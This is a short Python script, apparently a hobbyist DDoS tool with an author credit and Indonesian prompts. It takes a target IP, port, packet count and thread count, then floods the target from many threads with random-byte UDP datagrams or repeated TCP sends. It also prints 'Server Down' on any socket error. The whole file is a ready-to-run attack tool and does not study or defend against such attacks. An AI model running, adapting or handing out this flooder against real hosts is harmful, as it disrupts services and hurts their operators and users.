#Autor By 𝙂𝙯𝙖𝙖𝙭𝙮𝙯
import random
import socket
import threading
import os

os.system("clear")
print("#-- DOOS BY 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 --#")
print("--> KALAU MAU PAKEK GANTENG DULU<--")
print("#-- TOOLS BY 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 --#")
ip = str(input(" Masukan IP:"))
port = int(input(" Port:"))
choice = str(input(" Gas Ddos Gak ni?(y/n):"))
times = int(input(" Mau Berapa Packets?:"))
threads = int(input(" Isi Packets Threads?:"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!!")
		except:
			print("[!] Server Down!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!!")
		except:
			s.close()
			print("[*] Server Down")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()